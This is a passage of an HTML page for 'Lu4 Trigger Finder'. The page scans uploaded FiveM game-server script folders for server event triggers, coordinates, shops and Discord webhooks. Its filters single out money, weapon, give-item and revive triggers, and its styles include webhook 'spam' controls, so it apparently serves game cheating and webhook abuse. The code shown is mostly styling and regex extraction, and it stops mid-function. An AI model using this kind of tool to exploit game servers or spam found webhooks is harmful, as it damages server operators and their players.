<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Corrected viewport meta tag -->
  <!-- Favicon -->
  <link rel="icon" href="chomik.jpg" type="image/jpeg">
  <title>Lu4 Trigger Finder</title>
  <!-- Use Fira Code font -->
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
  <!-- Include Font Awesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <!-- Enhanced styles -->
  <link rel="stylesheet" href="enhanced-styles.css">
  <style>
    /* Define theme colors */
    :root {
      --bg-color: #0a0a0a;
      --container-bg: rgba(0, 0, 0, 0.5);
      --text-color: #c0c0c0; /* Light gray for general text */
      --primary-color: #7400d9; /* Purple */
      --accent-color: #7a03e0; /* Slightly different purple for accents */
      --border-color: rgba(122, 3, 224, 0.5); /* Purple border */
      --border-radius: 0.4rem; /* 6.4px */
      --font-family: 'Fira Code', monospace;
      --input-bg: #1a1a1a; /* Darker input background */
    }

    /* Basic page styling */
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: var(--font-family);
      background-color: var(--bg-color);
      color: var(--text-color);
      opacity: 0;
      animation: fadeIn 1.5s forwards;
      overflow-x: hidden; /* Prevent horizontal scroll */
      overflow-y: auto; /* Allow vertical scroll if needed */
    }

    /* Add global custom cursor style */
    * {
      cursor: url(jojo/hqizezkx5r.cur) 0 0, auto !important;
      box-sizing: border-box; /* Include padding and border in element's total width and height */
    }

    /* Video Background */
    #video-bg { /* Use consistent ID */
      position: fixed;
      right: 0;
      bottom: 0;
      min-width: 100%;
      min-height: 100%;
      width: auto;
      height: auto;
      z-index: -10;
      object-fit: cover;
      filter: blur(2px) brightness(100%);
    }

    /* Click to Start Overlay Styles */
    #text-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10002;
      cursor: pointer;
      transition: opacity 0.5s ease;
      opacity: 1;
    }
    #text-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    #click-text {
      color: white;
      font-size: 2em;
      font-weight: bold;
      font-family: var(--font-family);
    }

    /* Main content wrapper - centered */
    .main-wrapper {
      display: flex;
      min-height: 100vh;
      padding: 2rem 0 2rem 0; /* Consistent padding */
      width: 100%;
      justify-content: center;
      align-items: center; /* Center vertically */
    }

    /* Main content container - adapted */
    .container {
      max-width: 50rem; /* Increased max-width for finder */
      width: 90%;
      margin: 0 auto;
      padding: 0 1rem;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    /* General component styling (applied to #finder-app) */
    .component {
      background-color: var(--container-bg);
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      padding: 1.5rem;
      backdrop-filter: blur(5px);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      width: 100%;
      text-align: center; /* Keep text-align center for the main app container */
    }

    /* Mute button styling */
    #mute-button { /* Use consistent ID */
      position: fixed;
      top: 20px;
      right: 20px;
      background: linear-gradient(135deg, rgba(116, 0, 217, 0.8), rgba(122, 3, 224, 0.8));
      border: 2px solid var(--border-color);
      color: var(--text-color);
      font-size: 1.5rem;
      cursor: url('GTA 5 Web Cursor.cur'), pointer; /* Specific cursor */
      z-index: 1001;
      transition: all 0.3s ease;
      padding: 12px;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(10px);
      box-shadow: 0 4px 15px rgba(116, 0, 217, 0.3);
    }

    #mute-button:hover {
      transform: scale(1.1) rotate(5deg);
      background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
      box-shadow: 0 6px 25px rgba(116, 0, 217, 0.5);
      border-color: var(--accent-color);
    }

    #mute-button:active {
      transform: scale(0.95);
    }

    /* Finder Specific Styles - Adapted to Theme */
    h1 {
      font-family: var(--font-family);
      font-size: 1.8em;
      color: var(--primary-color);
      text-shadow: 0 0 5px rgba(116, 0, 217, 0.5);
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      white-space: nowrap;
    }

    /* Search and Filter Row */
    .search-filter-row {
      display: flex;
      flex-wrap: wrap; /* Allow wrapping */
      align-items: center;
      gap: 10px;
      margin-bottom: 1rem;
    }

    #search,
    #folder-input { /* Style folder input like search */
      flex: 1;
      padding: 10px;
      background-color: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      min-width: 150px; /* Ensure minimum width */
    }

    #search:focus,
    #folder-input:focus {
      outline: none;
      border-color: var(--accent-color);
    }

    /* Style file input button */
    #folder-input::file-selector-button {
        background-color: var(--primary-color);
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: var(--border-radius);
        cursor: pointer;
        font-family: var(--font-family);
        transition: filter 0.3s ease;
        margin-right: 10px;
    }
    #folder-input::file-selector-button:hover {
        filter: brightness(1.25);
    }


    /* General Button Styling */
    button {
      padding: 12px 24px;
      background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
      color: white;
      border: 1px solid var(--border-color);
      cursor: pointer;
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      transition: all 0.3s ease;
      font-weight: 600;
      outline: none;
      position: relative;
      overflow: hidden;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }

    button:hover::before {
      width: 300px;
      height: 300px;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(116, 0, 217, 0.4);
    }

    button:disabled {
      background: #555; /* Keep disabled style */
      border-color: #444;
      cursor: not-allowed;
      filter: brightness(0.7);
      transform: none;
      box-shadow: none;
    }

    button:disabled::before {
      display: none;
    }

    /* Dropdown button inherits general button styles */
    .dropdown button {
      min-width: 120px;
    }

    .dropdown-content {
      display: none;
      position: absolute;
      background-color: var(--input-bg); /* Use input background */
      min-width: 180px; /* Adjusted width */
      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.4);
      padding: 10px;
      z-index: 1002;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      text-align: left; /* Align labels left */
    }

    .dropdown:hover .dropdown-content {
      display: block;
    }

    .dropdown-content label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-color);
      position: relative;
      font-size: 0.9em;
      cursor: pointer; /* Use default pointer */
    }
     .dropdown-content label input[type="checkbox"] {
        accent-color: var(--primary-color);
        margin-right: 8px;
        cursor: pointer; /* Use default pointer */
     }

    .dropdown-content label:hover .filter-explanation {
      display: block;
    }

    .filter-explanation {
      display: none;
      position: absolute;
      top: 0;
      left: 105%; /* Position slightly to the right */
      background-color: rgba(0, 0, 0, 0.9);
      color: var(--primary-color); /* Purple text */
      padding: 8px 12px;
      border-radius: var(--border-radius);
      font-size: 0.8em;
      font-weight: 600;
      width: 220px;
      z-index: 1003; /* Above dropdown content */
      border: 1px solid var(--border-color);
      white-space: pre-line; /* Allow line breaks */
    }

    /* Fixed Height for Results Container */
    #results-container {
      margin-top: 1rem;
      height: 350px;
      overflow-y: auto;
      border: 1px solid var(--border-color);
      padding: 10px;
      background-color: rgba(0, 0, 0, 0.2); /* Slightly transparent background */
      border-radius: var(--border-radius);
      text-align: left; /* Align trigger text left */
      position: relative;
    }

    /* Custom scrollbar for results container */
    #results-container::-webkit-scrollbar {
      width: 8px;
    }
    #results-container::-webkit-scrollbar-track {
      background: var(--input-bg);
      border-radius: 4px;
    }
    #results-container::-webkit-scrollbar-thumb {
      background: var(--primary-color);
      border-radius: 4px;
    }
    #results-container::-webkit-scrollbar-thumb:hover {
      background: var(--accent-color);
    }

    .trigger {
      background: var(--input-bg); /* Darker background for each item */
      padding: 15px;
      border: 1px solid var(--border-color);
      margin-bottom: 10px;
      border-radius: var(--border-radius);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .trigger:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(116, 0, 217, 0.3);
      border-color: var(--accent-color);
    }

    .trigger::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .trigger:hover::before {
      opacity: 1;
    }

    .trigger .full-trigger {
      color: var(--text-color); /* Regular text color */
      font-weight: bold;
      word-break: break-all; /* Break long trigger names */
      font-family: var(--font-family);
      font-size: 0.95em;
      line-height: 1.4;
      margin-bottom: 8px;
    }

    .trigger .folder {
      color: var(--accent-color); /* Use accent color for folder */
      font-size: 0.85em;
      margin-top: 5px;
      opacity: 0.8;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .trigger .folder::before {
      content: '📁';
      font-size: 12px;
    }

    #download-btn {
      margin-top: 1rem;
    }

    .error {
      color: #ff4444;
      margin-top: 10px;
    }

    .success {
      color: #00cc66;
      margin-top: 10px;
    }

    #progress-container {
      width: 100%;
      background-color: var(--input-bg);
      margin-top: 1rem;
      display: none;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      overflow: hidden; /* Ensure progress bar stays within borders */
    }

    #progress-bar {
      width: 0%;
      height: 25px; /* Slightly smaller height */
      background-color: var(--primary-color);
      text-align: center;
      line-height: 25px;
      color: white;
      border-radius: 0; /* Remove radius from bar itself */
      transition: width 0.3s ease; /* Smooth progress transition */
    }

    .highlight {
      background-color: yellow;
      font-weight: bold;
      color: #000;
    }

    /* Webhook Related Styles - Adapted */
    .webhook-container {
      margin-top: 1rem;
      padding: 15px;
      background: rgba(0, 0, 0, 0.2); /* Match results container background */
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      max-height: 300px;
      overflow-y: auto;
      scrollbar-width: thin;
      scrollbar-color: var(--primary-color) var(--input-bg); /* Themed scrollbar */
      text-align: left; /* Align content left */
      display: none; /* Hidden by default */
    }

    .webhook-container.visible {
      display: block; /* Show when has visible class */
    }

    /* Webkit scrollbar styles */
    .webhook-container::-webkit-scrollbar {
      width: 8px;
    }
    .webhook-container::-webkit-scrollbar-track {
      background: var(--input-bg);
      border-radius: 4px;
    }
    .webhook-container::-webkit-scrollbar-thumb {
      background: var(--primary-color);
      border-radius: 4px;
    }
    .webhook-container::-webkit-scrollbar-thumb:hover {
      background: var(--accent-color);
    }

    .webhook {
      display: grid;
      grid-template-columns: auto 1fr;
      gap: 15px;
      background: var(--input-bg); /* Match trigger item background */
      padding: 15px;
      margin: 10px 0;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      transition: border-color 0.2s;
    }

    .webhook:hover {
      border-color: var(--accent-color);
    }

    .webhook-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
    }

    .webhook-content {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .webhook-url {
      color: #00ff00; /* Keep green for URLs */
      word-break: break-all;
      font-family: monospace;
      font-size: 0.9em;
      padding: 5px;
      background: rgba(0,0,0,0.3); /* Darker background for URL */
      border-radius: 4px;
      border: 1px solid var(--border-color);
    }

     .webhook-info {
        font-size: 0.9em;
        font-style: italic;
     }
     .webhook-status {
        font-weight: bold;
     }

    .webhook-controls {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      align-items: center; /* Align items vertically */
    }

    .webhook-spam-input,
    .mention-tag { /* Style select like input */
      background: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      padding: 8px;
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      flex: 1;
      min-width: 150px; /* Minimum width */
    }

    .webhook-spam-input:focus,
    .mention-tag:focus {
      border-color: var(--accent-color);
      outline: none;
    }

    /* Style select dropdown options */
    .mention-tag option {
        background: var(--input-bg);
        color: var(--text-color);
    }

    /* Style webhook buttons smaller */
    .webhook-controls button {
        padding: 8px 16px;
        font-size: 0.9em;
        min-width: 80px;
    }
    .webhook-controls .spam-btn,
    .webhook-controls .stop-btn {
        min-width: 90px; /* Ensure enough space for text/icon */
    }

    /* Fade-in animations */
    @keyframes fadeIn {
      to { opacity: 1; }
    }

    /* Typing effect for messages */
    .typing-effect {
      overflow: hidden;
      border-right: 2px solid var(--primary-color);
      white-space: nowrap;
      animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
    }

    @keyframes typing {
      from { width: 0; }
      to { width: 100%; }
    }

    @keyframes blink-caret {
      from, to { border-color: transparent; }
      50% { border-color: var(--primary-color); }
    }

    /* Enhanced progress bar */
    #progress-bar {
      width: 0%;
      height: 30px;
      background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
      text-align: center;
      line-height: 30px;
      color: white;
      border-radius: 0;
      transition: width 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    #progress-bar::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      animation: shimmer 2s infinite;
    }

    @keyframes shimmer {
      0% { left: -100%; }
      100% { left: 100%; }
    }


    /* Snowflake Styling - Enhanced */
    .snowflake {
      position: fixed;
      top: -10%;
      color: #fff;
      font-size: 1em; /* Use em for scalability */
      user-select: none;
      pointer-events: none;
      animation: fall linear infinite;
      opacity: 0.8;
      z-index: 9998; /* Below overlay/mute, above background */
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
    }

    .snowflake.special {
      color: var(--primary-color);
      text-shadow: 0 0 15px var(--primary-color);
      font-size: 1.5em;
    }

    @keyframes fall {
      0% {
        transform: translateY(0) rotate(0deg);
        opacity: 0.8;
      }
      100% {
        transform: translateY(110vh) rotate(360deg);
        opacity: 0;
      }
    }

    /* Pulse animation for special elements */
    @keyframes pulse {
      0%, 100% {
        opacity: 1;
        transform: scale(1);
      }
      50% {
        opacity: 0.7;
        transform: scale(1.05);
      }
    }

    /* Add glowing effect to main title */
    h1 {
      font-family: var(--font-family);
      font-size: 1.8em;
      color: var(--primary-color);
      text-shadow: 0 0 20px rgba(116, 0, 217, 0.8), 0 0 40px rgba(116, 0, 217, 0.4);
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      white-space: nowrap;
      animation: pulse 3s ease-in-out infinite;
    }

    /* Stats display */
    .stats-container {
      display: flex;
      justify-content: space-around;
      margin: 1rem 0;
      padding: 1rem;
      background: rgba(116, 0, 217, 0.1);
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
    }

    .stat-item {
      text-align: center;
      color: var(--text-color);
    }

    .stat-number {
      font-size: 1.5em;
      font-weight: bold;
      color: var(--primary-color);
      display: block;
    }

    .stat-label {
      font-size: 0.8em;
      opacity: 0.8;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    /* Enhanced search input */
    #search,
    #folder-input {
      flex: 1;
      padding: 12px 16px;
      background-color: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      border-radius: var(--border-radius);
      font-family: var(--font-family);
      min-width: 150px;
      transition: all 0.3s ease;
      position: relative;
    }

    #search:focus,
    #folder-input:focus {
      outline: none;
      border-color: var(--accent-color);
      box-shadow: 0 0 15px rgba(116, 0, 217, 0.3);
      transform: translateY(-1px);
    }

    /* Loading animation */
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(116, 0, 217, 0.3);
      border-radius: 50%;
      border-top-color: var(--primary-color);
      animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

  </style>
</head>
<body>
  <!-- Video Background - Use consistent ID and source -->
  <video id="video-bg" autoplay muted loop playsinline>
    <source src="2pac.mp4" type="video/mp4"> <!-- Match skidTriggerCreator video -->
    Your browser does not support the video tag.
  </video>

  <!-- Click to Start Overlay - Use consistent structure -->
  <div id="text-overlay">
    <p id="click-text">Click to Start</p>
  </div>

  <!-- Mute Button - Use consistent structure -->
  <button id="mute-button" aria-label="Toggle sound">
    <i class="fas fa-volume-high"></i> <!-- Font Awesome icon -->
  </button>

  <!-- Main Content Wrapper -->
  <div class="main-wrapper">
    <div class="container">
      <!-- Finder App as a component -->
      <div id="finder-app" class="component"> <!-- Changed ID, added class -->
        <h1><i class="fas fa-search"></i> Lu4 Trigger Finder</h1> <!-- Added icon -->

        <!-- Stats Container -->
        <div class="stats-container" id="stats-container">
          <div class="stat-item">
            <span class="stat-number" id="triggers-count">0</span>
            <span class="stat-label">Triggers</span>
          </div>
          <div class="stat-item">
            <span class="stat-number" id="webhooks-count">0</span>
            <span class="stat-label">Webhooks</span>
          </div>
          <div class="stat-item">
            <span class="stat-number" id="files-count">0</span>
            <span class="stat-label">Files Scanned</span>
          </div>
          <div class="stat-item">
            <span class="stat-number" id="shops-count">0</span>
            <span class="stat-label">Shops</span>
          </div>
          <div class="stat-item">
            <span class="stat-number" id="coords-count">0</span>
            <span class="stat-label">Coordinates</span>
          </div>
        </div>

        <!-- Search and Filter Row -->
        <div class="search-filter-row">
          <input type="text" id="search" placeholder="Search triggers or script folders...">
          <button id="search-button"><i class="fas fa-search"></i> Search</button> <!-- Added icon -->
          <div class="dropdown">
            <button><i class="fas fa-filter"></i> Filters</button> <!-- Added icon -->
            <div class="dropdown-content" id="filters">
              <!-- Filter checkboxes remain the same -->
              <label><input type="checkbox" id="filter-money" value="money"> Money
                <div class="filter-explanation">Triggers related to money transactions.</div>
              </label>
              <label><input type="checkbox" id="filter-weapon" value="weapon"> Weapon
                <div class="filter-explanation">Triggers related to weapons or weapon spawns.</div>
              </label>
              <label><input type="checkbox" id="filter-vehicle" value="vehicle"> Vehicle
                <div class="filter-explanation">Triggers related to vehicles or vehicle spawns.</div>
              </label>
              <label><input type="checkbox" id="filter-job" value="job"> Job
                <div class="filter-explanation">Triggers related to jobs or job assignments.</div>
              </label>
              <label><input type="checkbox" id="filter-giveitem" value="giveitem"> Give Item
                <div class="filter-explanation">Triggers related to giving items to players.</div>
              </label>
              <label><input type="checkbox" id="filter-revive" value="revive"> Revive
                <div class="filter-explanation">Triggers related to reviving players.</div>
              </label>
              <label><input type="checkbox" id="filter-handcuff" value="handcuff"> Handcuff
                <div class="filter-explanation">Triggers related to handcuffing players.</div>
              </label>
              <label><input type="checkbox" id="filter-setjob" value="setjob"> Set Job
                <div class="filter-explanation">Triggers related to setting a player's job.</div>
              </label>
              <label><input type="checkbox" id="filter-bait" value="bait"> Bait Trigger
                <div class="filter-explanation">Triggers designed to detect or punish exploits.</div>
              </label>
              <label><input type="checkbox" id="filter-comms" value="comms"> Comms
                <div class="filter-explanation">Triggers related to community service or tasks.</div>
              </label>
              <label><input type="checkbox" id="filter-jail" value="jail"> Jail
                <div class="filter-explanation">Triggers related to jailing or arresting players.</div>
              </label>
            </div>
          </div>
        </div>

        <input type="file" id="folder-input" webkitdirectory directory multiple>
        <div id="progress-container">
          <div id="progress-bar">0%</div>
        </div>
        <!-- Webhook container before results -->
        <div class="webhook-container">
          <h2><i class="fab fa-discord"></i> Found Webhooks</h2> <!-- Added heading -->
          <div id="webhooks-list"></div>
        </div>
        <!-- Results container -->
        <div id="results-container">
          <div id="results"></div>
        </div>
        <div id="message"></div>
        <button id="download-btn" disabled><i class="fas fa-download"></i> Download Results</button> <!-- Added icon -->
      </div>
    </div>
  </div>

  <!-- Audio Element - Use consistent ID and source -->
  <audio id="background-music" src="oooo.mp3" loop preload="auto"></audio> <!-- Match skidTriggerCreator audio -->

  <script>
    // ... existing constants (DEBUG_MODE, allTriggers, allShops) ...
    const DEBUG_MODE = true;
    let allTriggers = []; // Store all triggers for search functionality
    let allShops = []; // Store all shops for download functionality
    let allCoords = []; // Store all coordinates found

    // Remove dynamic title emoji logic
    // const emojis = [...]
    // function updateTitleWithEmoji() { ... }
    // setInterval(updateTitleWithEmoji, 500);
    // updateTitleWithEmoji();
    document.title = "🔍 Lu4 Trigger Finder 🔍"; // Set a static title

    // --- Merged JavaScript from skidTriggerCreator ---

    // Click to start overlay
    const overlay = document.getElementById('text-overlay'); // Use new ID
    const clickText = document.getElementById('click-text'); // Use new ID
    const backgroundMusic = document.getElementById('background-music'); // Use new ID
    const videoBg = document.getElementById('video-bg'); // Use new ID

    if (overlay && clickText && backgroundMusic && videoBg) {
        overlay.addEventListener('click', function() {
            overlay.classList.add('hidden');
            initializeMuteState(); // Initialize mute state based on localStorage
            backgroundMusic.play().catch(error => {
                console.log("Background music autoplay failed:", error);
            });
            videoBg.play().catch(error => {
                console.log("Background video autoplay failed:", error);
            });
        }, { once: true });
    } else {
        console.error("Overlay, click text, background music, or video background element not found.");
        if(overlay) overlay.style.display = 'none';
    }

    // Mute button functionality
    const muteButton = document.getElementById('mute-button'); // Use new ID
    const muteIcon = muteButton ? muteButton.querySelector('i') : null; // Check if muteButton exists
    const audioElements = [backgroundMusic, videoBg]; // Include video in mute control
    let isMuted = localStorage.getItem('muted') === 'true';

    function updateMuteStatus(muted) {
      isMuted = muted;
      audioElements.forEach(audio => {
        if (audio) audio.muted = isMuted;
      });
      if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
      localStorage.setItem('muted', isMuted);
      if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
    }

    function toggleMute() {
      updateMuteStatus(!isMuted);
    }

    function initializeMuteState() {
      isMuted = localStorage.getItem('muted') === 'true';
      audioElements.forEach(audio => {
        if (audio) audio.muted = isMuted;
      });
       if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
       if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
    }

    if (muteButton) {
        muteButton.addEventListener('click', toggleMute);
    }
    // initializeMuteState called after overlay click

    // Enhanced snowflake effect
    function createSnowflake() {
      const snowflake = document.createElement('div');
      const isSpecial = Math.random() < 0.1; // 10% chance for special snowflake
      
      if (isSpecial) {
        snowflake.innerHTML = '✨'; // Special sparkle
        snowflake.classList.add('snowflake', 'special');
      } else {
        const symbols = ['❄', '❅', '❆', '*'];
        snowflake.innerHTML = symbols[Math.floor(Math.random() * symbols.length)];
        snowflake.classList.add('snowflake');
      }
      
      snowflake.style.left = Math.random() * 100 + 'vw';
      const duration = Math.random() * 10 + 10; // 10-20 seconds fall time
      snowflake.style.animationDuration = duration + 's';
      snowflake.style.opacity = Math.random() * 0.5 + 0.3; // 0.3 - 0.8 opacity
      snowflake.style.fontSize = Math.random() * 10 + 10 + 'px'; // 10px - 20px size

      document.body.appendChild(snowflake);

      setTimeout(() => {
        snowflake.remove();
      }, (duration + 1) * 1000);
    }

    function startSnowfall() {
      const currentMonth = new Date().getMonth() + 1;
      if (currentMonth === 12 || currentMonth === 1 || currentMonth === 2) {
        // Check if interval already running to avoid duplicates if script reloads
        if (!window.snowfallInterval) {
             window.snowfallInterval = setInterval(createSnowflake, 300);
        }
      }
    }
    // Start snowfall on load (if it's winter)
    startSnowfall();

    // --- Original Trigger Finder JavaScript (adapted variables) ---

    // Removed old overlay, mute, video, snowflake JS

    // Function definitions first
    // Enhanced stats update function with animation
    function updateStats() {
      const triggersCount = document.getElementById('triggers-count');
      const webhooksCount = document.getElementById('webhooks-count');
      const filesCount = document.getElementById('files-count');
      const shopsCount = document.getElementById('shops-count');
      const coordsCount = document.getElementById('coords-count');
      
      // Animate the numbers
      if (triggersCount) animateCounter(triggersCount, allTriggers.length);
      if (webhooksCount) {
        const uniqueWebhooks = document.querySelectorAll('.webhook').length;
        animateCounter(webhooksCount, uniqueWebhooks);
      }
      if (shopsCount) animateCounter(shopsCount, allShops.length);
      if (coordsCount) animateCounter(coordsCount, allCoords.length);
    }

    // Counter animation
    function animateCounter(element, target) {
      const start = parseInt(element.textContent) || 0;
      const duration = 1000;
      const startTime = performance.now();
      
      function updateCounter(currentTime) {
        const elapsed = currentTime - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const current = Math.floor(start + (target - start) * progress);
        
        element.textContent = current;
        
        if (progress < 1) {
          requestAnimationFrame(updateCounter);
        }
      }
      
      requestAnimationFrame(updateCounter);
    }

    // Enhanced message display function
    function showMessage(text, type = 'success', typing = false) {
      const messageDiv = document.getElementById('message');
      if (!messageDiv) return;
      
      messageDiv.className = type;
      
      if (typing) {
        messageDiv.classList.add('typing-effect');
        messageDiv.textContent = '';
        let i = 0;
        const typewriter = () => {
          if (i < text.length) {
            messageDiv.textContent += text.charAt(i);
            i++;
            setTimeout(typewriter, 30); // Reduced from 50ms to 30ms for smoother typing
          } else {
            setTimeout(() => messageDiv.classList.remove('typing-effect'), 1000);
          }
        };
        typewriter();
      } else {
        messageDiv.textContent = text;
      }
    }

    // Add loading indicator
    function showLoading(show = true) {
      const searchButton = document.getElementById('search-button');
      if (!searchButton) return;
      
      if (show) {
        searchButton.innerHTML = '<div class="loading"></div> Processing...';
        searchButton.disabled = true;
      } else {
        searchButton.innerHTML = '<i class="fas fa-search"></i> Search';
        searchButton.disabled = false;
      }
    }

    // Notification system
    function showNotification(message, type = 'info', duration = 3000) {
      const notification = document.createElement('div');
      notification.className = `notification ${type}`;
      notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 10px;">
          <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i>
          <span>${message}</span>
        </div>
      `;
      
      document.body.appendChild(notification);
      
      setTimeout(() => notification.classList.add('show'), 100);
      
      setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => notification.remove(), 300);
      }, duration);
    }

    // Element references
    const folderInput = document.getElementById('folder-input');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.getElementById('progress-bar');
    const resultsContainer = document.getElementById('results'); // Keep this ID for results content
    const searchInput = document.getElementById('search');
    const searchButton = document.getElementById('search-button');
    const downloadButton = document.getElementById('download-btn');
    const filters = document.querySelectorAll('#filters input[type="checkbox"]');

    // Initialize stats (now that function is defined)
    updateStats();

    // Helper functions for the trigger finder
    function extractTriggers(content, folderPath) {
      // Blacklist RegisterNetEvent and only capture TriggerEvent and TriggerServerEvent
      const triggerRegex = /(?:TriggerEvent|TriggerServerEvent)\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;
      const clientTriggerRegex = /TriggerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;
      const serverTriggerRegex = /TriggerServerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;

      const triggers = [];
      let match;

      // Generic trigger capture (excluding RegisterNetEvent)
      while ((match = triggerRegex.exec(content)) !== null) {
        triggers.push({
          trigger: match[1], // Just the event name
          fullLine: match[0], // Keep the full line for context if needed
          folder: folderPath,
          type: match[0].startsWith('TriggerServerEvent') ? 'Server' : 'Client'
        });
      }

      // Remove duplicates based on trigger name and folder
      const uniqueTriggers = Array.from(new Map(triggers.map(t => [`${t.folder}-${t.trigger}`, t])).values());

      // Return formatted for display
      return uniqueTriggers.map(t => ({
          trigger: t.fullLine, // Display the full line
          folder: t.folder
      }));
    }

    // Enhanced coords extraction function
    function extractCoords(content, folderPath) {
      const coords = [];
      
      // Comprehensive coordinate patterns
      const coordPatterns = [
        // Vector3 patterns
        /vector3\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
        // Vector4 patterns (includes heading)
        /vector4\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
        // Table/object coordinate patterns
        /{\s*x\s*=\s*(-?\d+\.?\d*)\s*,\s*y\s*=\s*(-?\d+\.?\d*)\s*,\s*z\s*=\s*(-?\d+\.?\d*)/gi,
        // Array coordinate patterns
        /{\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*}/g,
        // Blip creation coordinates
        /AddBlipForCoord\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
        // SetEntityCoords patterns
        /SetEntityCoords\s*\([^,]+,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)/gi,
      ];

      coordPatterns.forEach((pattern, patternIndex) => {
        let match;
        while ((match = pattern.exec(content)) !== null) {
          let x, y, z, h = 0;
          
          if (patternIndex === 0) { // vector3
            [, x, y, z] = match;
          } else if (patternIndex === 1) { // vector4
            [, x, y, z, h] = match;
          } else if (patternIndex === 2) { // table format
            [, x, y, z] = match;
          } else if (patternIndex === 3) { // array format
            [, x, y, z] = match;
          } else if (patternIndex === 4 || patternIndex === 5) { // blip or entity coords
            [, x, y, z] = match;
          }

          // Filter out invalid coordinates (too large/small values)
          const xNum = parseFloat(x);
          const yNum = parseFloat(y);
          const zNum = parseFloat(z);
          
          if (Math.abs(xNum) < 10000 && Math.abs(yNum) < 10000 && Math.abs(zNum) < 1000) {
            coords.push({
              x: xNum,
              y: yNum,
              z: zNum,
              h: h ? parseFloat(h) : 0,
              folder: folderPath,
              context: match[0],
              type: patternIndex === 1 ? 'vector4' : patternIndex === 0 ? 'vector3' : 'other'
            });
          }
        }
      });

      return coords;
    }

    function extractShops(content) {
        // This function seems complex and might need careful review/debugging
        // For now, assume the original logic is mostly correct but add logging
        try {
            const shops = [];
